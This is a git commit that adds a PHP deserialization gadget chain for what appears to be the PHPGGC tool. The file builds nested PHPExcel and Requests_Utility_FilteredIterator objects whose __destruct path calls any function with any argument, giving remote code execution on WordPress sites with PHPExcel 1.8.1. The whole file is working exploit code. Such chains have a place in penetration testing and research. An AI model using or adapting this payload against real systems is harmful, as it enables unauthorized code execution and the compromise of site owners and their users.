3f1d9de3e0032509d4f7ab8e343fd2f3b2fd8aeb
CyanM0un <75713958+CyanM0un@users.noreply.github.com>
2023-09-15 23:22:16 +0800

    Add files via upload

---
+++ gadgetchains/WordPress/PHPExcel/RCE/8/chain.php
@@ -0,0 +1,23 @@
+<?php
+
+namespace GadgetChain\WordPress\PHPExcel;
+
+class RCE8 extends \PHPGGC\GadgetChain\RCE\FunctionCall
+{
+    public static $version = '1.8.1 & WP 5.0.11';
+    public static $vector = '__destruct';
+    public static $author = 'CyanM0un';
+    public static $information = 'Tested up to WP 5.0.11 and PHPExcel 1.8.1';
+    
+    public function generate(array $parameters)
+    {
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+
+        return new \PHPExcel_CachedObjectStorage_Memcache(
+                    new \PHPExcel_RichText(
+                        new \Requests_Utility_FilteredIterator([$parameter], $function)
+                )
+            );
+    }
+}
